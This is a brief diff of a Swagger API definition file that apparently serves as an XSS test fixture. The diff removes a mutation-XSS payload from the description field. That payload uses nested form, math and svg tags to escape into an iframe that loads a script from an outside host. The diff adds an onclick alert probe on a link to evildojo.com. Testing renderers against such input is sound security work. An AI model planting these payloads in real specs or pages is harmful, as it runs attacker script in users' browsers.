@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://standing-salt.surge.sh/script.js></script>">
+  description: this is a description with tags. <a href="https://www.evildojo.com" onclick="alert``">www.evildojo.com</a> Unicode: \u0064\u0065
   version: production
 basePath: /JSSResource/
 produces:
